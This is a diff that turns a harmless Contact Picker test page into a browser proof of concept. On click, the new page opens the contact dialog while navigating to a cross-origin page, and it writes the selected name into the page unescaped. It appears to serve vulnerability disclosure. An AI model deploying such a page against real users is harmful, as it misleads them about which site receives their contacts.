@@ -1,132 +1,54 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Contact Picker + Audio Policy PoC</title>
-    <meta charset="UTF-8">
-    <meta name="viewport"
-          content="width=device-width,initial-scale=1">
+    <title>PoC</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
 
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 30px 20px;
-        }
+    <script>
+        onclick = async () => {
 
-        button {
-            padding: 13px 22px;
-            border: none;
-            border-radius: 8px;
-            background: #1677ff;
-            color: white;
-            font-size: 16px;
-            cursor: pointer;
-        }
+            // TTS ketika halaman diklik
+            const utterance = new SpeechSynthesisUtterance(
+                "Contact picker test started."
+            );
 
-        #status {
-            margin-top: 20px;
-            padding: 15px;
-            background: #f2f2f2;
-            border-radius: 10px;
-            overflow-wrap: anywhere;
+            utterance.lang = "en-US";
+            utterance.rate = 1;
+            utterance.pitch = 1;
+
+            speechSynthesis.speak(utterance);
+
+            // Original Contact Picker logic
+            (async () => {
+                let contacts = await navigator.contacts.select(
+                    ["name"], {}
+                );
+
+                document.write(`
+                    <h1>
+                        <font color="red">Selected contact:</font>
+                        ${contacts[0]["name"]}
+                    </h1>
+                `);
+            })();
+
+            // Original cross-origin navigation logic
+            open("https://www.google.com", "PoC", "_blank");
         }
-    </style>
+    </script>
 </head>
 
 <body>
+    <br><br><br>
 
-<h1>Contact Picker PoC</h1>
+    <center>
+        <h1>
+            Click anywhere on the page to show the Contact
+            dialog over a cross-origin page!
+        </h1>
 
-<p>Contact Picker and Web Audio Policy Test</p>
-
-<button id="startButton">
-    Select Contact
-</button>
-
-<div id="status">
-    Waiting for user interaction...
-</div>
-
-<script>
-const statusBox = document.getElementById("status");
-
-function log(message) {
-    statusBox.textContent = message;
-}
-
-// Audio policy test on page load.
-async function testAutoplay() {
-    try {
-        const AudioClass =
-            window.AudioContext ||
-            window.webkitAudioContext;
-
-        if (!AudioClass) {
-            log("Web Audio API unavailable.");
-            return;
-        }
-
-        const context = new AudioClass();
-
-        log("Autoplay state: " + context.state);
-
-        try {
-            await context.resume();
-        } catch (error) {
-            log("Autoplay blocked: " + error.message);
-        }
-
-        log("AudioContext state: " + context.state);
-
-        await context.close();
-
-    } catch (error) {
-        log("Audio test error: " + error.message);
-    }
-}
-
-window.addEventListener("load", testAutoplay);
-
-// Contact selection and redirect.
-document.getElementById("startButton")
-.addEventListener("click", async () => {
-
-    if (!("contacts" in navigator)) {
-        alert("Contact Picker is not supported.");
-        return;
-    }
-
-    if (!window.isSecureContext) {
-        alert("HTTPS is required.");
-        return;
-    }
-
-    try {
-        log("Waiting for contact selection...");
-
-        const contacts = await navigator.contacts.select(
-            ["name", "tel"],
-            { multiple: false }
-        );
-
-        if (!contacts.length) {
-            log("No contact selected.");
-            return;
-        }
-
-        // Redirect after explicit contact selection.
-        log("Contact selected. Redirecting to Google...");
-
-        window.location.replace(
-            "https://www.google.com"
-        );
-
-    } catch (error) {
-        log("Contact selection failed: " + error.message);
-    }
-});
-</script>
-
+        <p>Contact Picker + TTS Test</p>
+    </center>
 </body>
 </html>
